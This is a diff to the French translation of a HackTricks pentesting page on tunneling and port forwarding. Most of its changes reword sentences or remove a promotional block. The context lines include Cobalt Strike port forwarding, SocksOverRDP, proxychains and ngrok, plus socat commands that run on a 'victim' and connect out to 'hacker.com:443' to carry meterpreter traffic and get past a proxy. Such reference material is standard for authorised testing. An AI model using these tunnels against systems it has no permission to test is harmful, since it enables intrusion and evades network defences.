@@ -15,18 +15,10 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Astuce Nmap
 
 {% hint style="warning" %}
-Les scans **ICMP** et **SYN** ne peuvent pas être tunnélisés à travers des proxies socks, donc nous devons **désactiver la découverte par ping** (`-Pn`) et spécifier des **scans TCP** (`-sT`) pour que cela fonctionne.
+**ICMP** et **SYN** scans ne peuvent pas être tunnélisés à travers des proxies socks, donc nous devons **désactiver la découverte par ping** (`-Pn`) et spécifier **les scans TCP** (`-sT`) pour que cela fonctionne.
 {% endhint %}
 
 ## **Bash**
@@ -182,7 +174,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 {% hint style="warning" %}
-Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là vers l'hôte:port indiqué.
+Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -268,7 +260,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
+Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime :
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -336,7 +328,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **prompt** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -365,7 +357,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Il s'authentifie contre un proxy et lie un port local qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
+Il s'authentifie contre un proxy et lie un port localement qui est redirigé vers le service externe que vous spécifiez. Ensuite, vous pouvez utiliser l'outil de votre choix via ce port.\
 Par exemple, cela redirige le port 443.
 ```
 Username Alice
@@ -424,7 +416,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Changer le DNS de proxychains
 
-Proxychains intercepte l'appel `gethostbyname` de libc et tunnelise la requête DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** utilisé par proxychains est **4.2.2.2** (codé en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un **environnement Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.
+Proxychains intercepte l'appel `gethostbyname` de la libc et tunnelise la requête DNS tcp à travers le proxy socks. Par **défaut**, le serveur **DNS** que proxychains utilise est **4.2.2.2** (codé en dur). Pour le changer, éditez le fichier : _/usr/lib/proxychains3/proxyresolv_ et changez l'IP. Si vous êtes dans un **environnement Windows**, vous pouvez définir l'IP du **contrôleur de domaine**.
 
 ## Tunnels en Go
 
@@ -493,12 +485,12 @@ chmod a+x ./ngrok
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Sniffing HTTP calls
+#### Sniffing des appels HTTP
 
 *Utile pour XSS, SSRF, SSTI ...*
 Directement depuis stdout ou dans l'interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunneling internal HTTP service
+#### Tunneling du service HTTP interne
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -527,14 +519,6 @@ addr: file:///tmp/httpbin/
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 {% hint style="success" %}
 Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -544,7 +528,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 <summary>Soutenir HackTricks</summary>
 
 * Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
